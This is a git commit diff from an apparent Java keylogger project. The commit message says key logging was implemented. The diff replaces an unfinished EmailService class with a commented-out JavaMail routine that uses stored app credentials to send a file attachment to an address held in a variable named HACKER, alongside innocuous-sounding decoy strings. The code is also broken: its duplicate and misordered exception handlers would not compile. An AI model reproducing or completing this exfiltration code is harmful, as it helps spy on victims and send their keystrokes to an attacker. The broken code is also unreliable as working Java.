ae3d4edbc392b0887d34973ca6176bb8b0588a9e
YadavGulshan <yadavgulshan542@gmail.com>
2021-12-13 23:48:00 +0530

    Added JNT jar file and implemented key logging

--- src/com/bufferoverflow/services/EmailService.java
+++ src/com/bufferoverflow/services/EmailService.java
@@ -1,32 +1,86 @@
-package com.bufferoverflow.services;
-
-import javax.mail.Session;
-import javax.xml.transform.Source;
-import java.util.Properties;
-
-public class EmailService  extends env{
-    public static final String[] jobs = {"baking some cakes!" , "cleaning my room!" , "completing my assignments!" , "eating my favourite dish!"};
-    private static final String EMAIL = env.APP_EMAIL;
-    private static final String PASSWORD = env.APP_PASSWORD;
-
-
-    private static final String TO = env.HACKER;
-
-    public static void main(String[] args) {
-        Properties props = new Properties();
-
-        // Enabling authentication.
-        props.put("mail.smtp.auth" , "true");
-
-        // Enabling tls for secure connection
-        props.put("mail.smtp.starttls.enable" , "true");
-
-        // Setting the host smtp server as gmail
-        props.put("mail.smtp.host" , "smtp.gmail.com");
-
-        // The port our program will hit. In order to send the email
-        props.put("mail.smtp.port" , "587");
-
-        Session
-    }
-}
+//package com.bufferoverflow.services;
+//
+//import javax.mail.*;
+//import javax.mail.internet.*;
+//import javax.sql.DataSource;
+//import javax.xml.transform.Source;
+//import java.util.Properties;
+//
+//public class EmailService  extends env{
+//    public static final String[] jobs = {"baking some cakes!" , "cleaning my room!" , "completing my assignments!" , "eating my favourite dish!"};
+//    private static final String EMAIL = env.APP_EMAIL;
+//    private static final String PASSWORD = env.APP_PASSWORD;
+//
+//
+//    private static final String TO = env.HACKER;
+//
+//
+//    public static void main(String [] args) {
+//        // Recipient's email ID needs to be mentioned.
+//        String to = TO;
+//
+//        // Sender's email ID needs to be mentioned
+//        String from = EMAIL;
+//
+//        // Assuming you are sending email from localhost
+//        String host = "localhost";
+//
+//        // Get system properties
+//        Properties properties = System.getProperties();
+//
+//        properties.setProperty("mail.user", EMAIL);
+//        properties.setProperty("mail.password", PASSWORD);
+//        // Setup mail server
+//        properties.setProperty("mail.smtp.host", host);
+//
+//        // Get the default Session object.
+//        Session session = Session.getDefaultInstance(properties);
+//
+//        try {
+//            // Create a default MimeMessage object.
+//            MimeMessage message = new MimeMessage(session);
+//
+//            // Set From: header field of the header.
+//            message.setFrom(new InternetAddress(from));
+//
+//            // Set To: header field of the header.
+//            message.addRecipient(Message.RecipientType.TO,new InternetAddress(to));
+//
+//            // Set Subject: header field
+//            message.setSubject("This is the Subject Line!");
+//
+//            // Create the message part
+//            BodyPart messageBodyPart = new MimeBodyPart();
+//
+//            // Fill the message
+//            messageBodyPart.setText("This is message body");
+//
+//            // Create a multipar message
+//            Multipart multipart = new MimeMultipart();
+//
+//            // Set text message part
+//            multipart.addBodyPart(messageBodyPart);
+//
+//            // Part two is attachment
+//            messageBodyPart = new MimeBodyPart();
+//            String filename = "file.txt";
+////            DataSource source = new FileDataSource(filename);
+////            messageBodyPart.setDataHandler(new DataHandler(source));
+//            messageBodyPart.setFileName(filename);
+//            multipart.addBodyPart(messageBodyPart);
+//
+//            // Send the complete message parts
+//            message.setContent(multipart );
+//
+//            // Send message
+//            Transport.send(message);
+//            System.out.println("Sent message successfully....");
+//        } catch (MessagingException mex) {
+//            mex.printStackTrace();
+//        } catch (AddressException e) {
+//            e.printStackTrace();
+//        } catch (MessagingException e) {
+//            e.printStackTrace();
+//        }
+//    }
+//}
